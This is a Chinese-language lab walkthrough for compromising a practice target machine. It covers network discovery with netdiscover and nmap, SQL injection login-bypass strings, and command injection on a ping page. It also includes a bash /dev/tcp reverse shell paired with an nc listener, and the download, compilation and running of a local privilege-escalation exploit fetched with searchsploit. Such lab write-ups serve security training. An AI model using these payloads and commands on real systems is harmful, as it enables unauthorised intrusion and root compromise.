靶機安裝教學

Step 1 - 找到靶機 IP

ifconfig - 查看自己的 IP


sudo netdisconver -r 10.0.2.0/16 - 查看本地端的 IP 尋找靶機
-r 指定查找範圍


sudo nmap -A -T4 10.0.2.15 - 該主機(可以是網址也可以是 ip)有開的常見 port 以及作業系統和版本資訊
-A(All) - 全面系統檢測、啟用腳本檢測、掃描等
-T4 - 針對 TCP 端口禁止動態掃描延遲超過 10ms



Step 2 - 找尋滲透測試進入點

打開 Firefox 連上http://10.0.2.5此網址


使用 SQL injection 在 username 輸入 ' or 1=1# 或admin' or '1'='1'/*或admin' #或admin' or 1=1-- 或 ' or 1 = 1 #– -。



Step 3 - 遠端程式碼執行(RCE, Remote Code Execution)

登入後看到這個頁面，是一個提供 ping 功能的頁面，試試看 Command-Injection。


;id - 查看目前靶機使用者資料


nc -nvlp 8080 - 監聽端口
-n - 不進行 DNS 查詢
-v - 顯示掃瞄訊息
-l - 開啟監聽模式
-p - 指定來源通訊埠


;bash -i >& /dev/tcp/10.0.2.5/8080 0>&1 - 建立了一個 TCP 反向 shell 連接，將目標系統的標準輸入、輸出和錯誤都與攻擊者的遠端位置相連接。
bash -i - 在本地端開個 bash
/dev/tcp/*.*.*.*(靶機IP)/****(port號) - 將輸出傳遞給遠端位置
0>&1 - 進行遠端輸入


id - 顯示用戶 ID


uname -a - 查詢系統版本
-a - 顯示所有訊息


lsb_release -a - 用來顯示 LSB(Linux Standard Base,Linux 標準基準)和特定版本的相關訊息



### Step 4 - 搜尋漏洞

searchsploit CentOS 4.5 - 找找看有沒有相關的攻擊腳本


searchsploit -m linux_x86/local/9542.c
-m - 表示 “mirror”（鏡像），它的作用是將 Exploit Database 中路徑為 linux_x86/local/9542.c 的漏洞利用程式文件複製到當前工作目錄


pytho3 -m http.server 80 - 開啟 http 相關服務
cd /tmp
wget http://10.0.2.5/9542.c - 下載 9542.c 檔案


ls - 查看剛剛下載的檔案
gcc 9542.c -o 9542 - -c制定目標名稱
ls - 查看編譯後是否有出現名為 9542 的執行檔
./9542 - 執行 9542 檔案
id - 顯示用戶 ID
